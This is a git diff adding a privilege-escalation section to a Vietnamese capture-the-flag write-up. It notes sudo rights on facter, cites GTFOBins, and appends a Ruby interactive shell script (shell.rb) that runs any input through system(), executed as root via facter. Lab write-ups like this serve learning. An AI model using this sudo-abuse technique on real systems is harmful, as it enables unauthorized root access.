@@ -83,8 +83,62 @@ Với (2), bởi vì file `id_ed25519` định dạng mới của OpenSSH lưu t
 
 ### Privilege Escalation
 
+Xem những lệnh mà user hiện tại được chạy với quyền sudo:
+
 ![](Attachments/Pasted%20image%2020260505183342.png)
+
+facter - gtfobins:
+
+![](Attachments/Pasted%20image%2020260505195159.png)
+
+Tức là file `.rb` sẽ được thực thi, dưới quyền root:
+
+https://0x77zen.medium.com/creating-your-first-shell-in-ruby-547743e83612
 
 ![](Attachments/Pasted%20image%2020260505184020.png)
 
+### Appendix
 
+`shell.rb`
+
+```ruby
+#!/usr/bin/env ruby  
+  
+require 'readline'  
+  
+puts " Simple Ruby Shell"  
+puts " Type 'help' to see available commands"  
+  
+Readline.completion_proc = proc do |s|  
+Dir.glob("#{s}") + Readline::HISTORY.grep(/^#{Regexp.escape(s)}/)  
+end  
+  
+while input = Readline.readline('> ', true)  
+break if input.nil?  
+input.strip!  
+next if input.empty?  
+  
+case input.downcase  
+when "exit"  
+break  
+when "clear"  
+system("clear") || system("cls")  
+when "help"  
+puts <<~HELP  
+  
+Simple Ruby Shell — Commands  
+  
+exit : Exit the shell  
+clear : Clear the screen  
+help : Show this help menu  
+  
+You can also run any valid system command.  
+  
+HELP  
+else  
+system(input)  
+end  
+end  
+  
+puts " Exiting shell."
+```
